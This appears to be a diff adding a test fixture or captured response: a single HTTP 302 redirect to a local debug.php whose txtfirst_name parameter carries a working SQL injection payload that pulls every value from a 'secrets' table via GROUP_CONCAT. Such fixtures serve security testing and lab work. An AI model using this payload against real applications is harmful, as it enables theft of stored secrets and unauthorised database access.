@@ -1,0 +1,2 @@
+HTTP/1.1 302 Found
+Location: http://127.0.0.1/secure/debug.php?s=3&txtfirst_name=fn1','mn1','ln1','suf1','111',(SELECT%20GROUP_CONCAT(value%20SEPARATOR%20',')%20FROM%20secrets));%20--%20&txtmiddle_name=mn&txtLast_name=ln&txtname_suffix=suf&txtdob=01011970&txtdl_nmbr=738458739&txtRetypeDL=738458739&btnContinue2=Continue
